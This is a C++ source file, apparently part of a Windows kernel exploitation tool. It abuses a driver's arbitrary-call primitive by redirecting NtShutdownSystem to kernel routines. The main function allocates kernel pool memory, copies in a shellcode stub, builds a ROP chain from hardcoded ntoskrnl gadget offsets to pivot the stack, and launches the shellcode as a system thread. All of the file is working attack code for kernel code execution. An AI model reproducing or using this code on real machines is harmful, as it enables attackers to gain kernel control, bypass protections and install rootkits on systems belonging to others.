#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* ShellcodeAllocation = reinterpret_cast<void*(*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x80, 0x100, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Shellcode @ 0x%p\n", ShellcodeAllocation);

    if (!ShellcodeAllocation)
        return EXIT_FAILURE;

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* StackAllocation = reinterpret_cast<void* (*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x40 | 0x2, 0x3000, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);

    if (!StackAllocation)
        return EXIT_FAILURE;
    
    // Write shellcode
    std::uint8_t ShellcodeTemplate[] =
    {
        0x48, 0xBD, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbp, StackAllocation
        0x48, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbx, address of 'leave; ret;' gadget
        0x53,                                                       // push rbx
        0xC3                                                        // ret
    };

    *(void**)(ShellcodeTemplate + 2) = StackAllocation;
    *(void**)(ShellcodeTemplate + 12) = (void*)(Driver::GetKernelModuleBase() + 0x57f99c); // leave; ret; gadget

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void*(*)(void*, void*, size_t)>(NtShutdownSystem)(ShellcodeAllocation, &ShellcodeTemplate, sizeof(ShellcodeTemplate));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    // Setup new rbp for pivoting
    void* NewRbpAddress = (void*)((uintptr_t)StackAllocation + 0x3000);
    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, &NewRbpAddress, sizeof(void*));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    // Write rop gadgets
    void* SizeOfShellcode = (void*)(sizeof(ShellcodeTemplate));
    void* PopRaxGadget = (void*)(Driver::GetKernelModuleBase() + 0x210e10); // pop rax; ret;
    void* PopRcxGadget = (void*)(Driver::GetKernelModuleBase() + 0x256c4a); // pop rcx; ret;
    void* PopRdxGadget = (void*)(Driver::GetKernelModuleBase() + 0x3cca89); // pop rdx; ret;
    void* RtlZeroMemoryAddress = (void*)(Driver::GetKernelModuleBase() + Driver::GetKernelFunctionOffset("RtlZeroMemory"));
    void* CallRbxGadget = (void*)(Driver::GetKernelModuleBase() + 0x6a9edf);// call rax; nop dword ptr [rax]; add rsp, 8; ret;
    void* PaddingAddress = (void*)0xC0FEBABEC0FEBABE;
    void* ReturnAddress = (void*)0xDEADBEEFDEADBEEF;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    // pop rcx;
    // <ptr to shellcode alloc>
    // pop rdx;
    // <size of shellcode alloc>
    // pop rbx;
    // <ptr to RtlZeroMemory>
    // call rax; nop dword ptr [rax]; add rsp, 8; ret;
    // 8 byte padding to account for "add rsp, 8" side-effect
    // <return addr>
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 1), &PopRcxGadget, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 2), &ShellcodeAllocation, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 3), &PopRdxGadget, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 4), &SizeOfShellcode, sizeof(void*));

    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 5), &PopRaxGadget, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 6), &RtlZeroMemoryAddress, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 7), &CallRbxGadget, sizeof(void*));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 8), &PaddingAddress, sizeof(void*)); // +8 padding
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 9), &ReturnAddress, sizeof(void*));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)ShellcodeAllocation, (void*)NULL);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    
    return EXIT_SUCCESS;
}